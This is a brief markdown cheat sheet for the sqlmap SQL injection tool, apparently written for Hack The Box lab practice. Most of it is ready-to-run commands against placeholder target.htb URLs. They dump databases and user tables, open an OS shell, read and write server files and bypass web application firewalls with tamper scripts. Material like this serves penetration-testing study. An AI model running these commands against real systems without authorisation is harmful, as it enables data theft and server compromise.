# sqlmap

## Purpose
Automatic SQL injection detection and exploitation tool. Tests for all major SQL injection types and can dump entire databases, read/write files, and get OS shells.

## Installation
```bash
sudo apt install sqlmap
```

## Quick Start
```bash
# Test a URL parameter
sqlmap -u "http://target.htb/page?id=1"

# Test POST data
sqlmap -u "http://target.htb/login" --data="user=admin&pass=test"

# With cookie/session
sqlmap -u "http://target.htb/page?id=1" --cookie="PHPSESSID=abc123"

# Dump database
sqlmap -u "http://target.htb/page?id=1" --dump

# List databases
sqlmap -u "http://target.htb/page?id=1" --dbs

# Enumerate tables
sqlmap -u "http://target.htb/page?id=1" -D dbname --tables

# Dump specific table
sqlmap -u "http://target.htb/page?id=1" -D dbname -T users --dump

# OS shell
sqlmap -u "http://target.htb/page?id=1" --os-shell

# From Burp request file
sqlmap -r request.txt
```

## Key Options
| Option | Description |
|--------|-------------|
| `-u` | Target URL with injectable parameter |
| `--data` | POST data |
| `-r` | Load HTTP request from file |
| `--dbs` | List databases |
| `--tables` | List tables |
| `--dump` | Dump table contents |
| `--os-shell` | OS command shell |
| `--file-read` | Read a file from server |
| `--file-write` | Write file to server |
| `--batch` | Auto-answer prompts (default) |
| `--level` | Test level 1-5 (higher=more tests) |
| `--risk` | Risk level 1-3 (higher=more aggressive) |
| `--tamper` | Use tamper scripts for WAF bypass |
| `--technique` | Specify injection types (BEUSTQ) |
| `--threads` | Number of threads |

## HTB Usage
- Always try `--level 5 --risk 3` if basic scan finds nothing
- Save Burp requests and use `-r request.txt` for complex injections
- Use `--tamper=space2comment` or similar for WAF bypass
- Check `--privileges` to see if DB user has file read/write perms
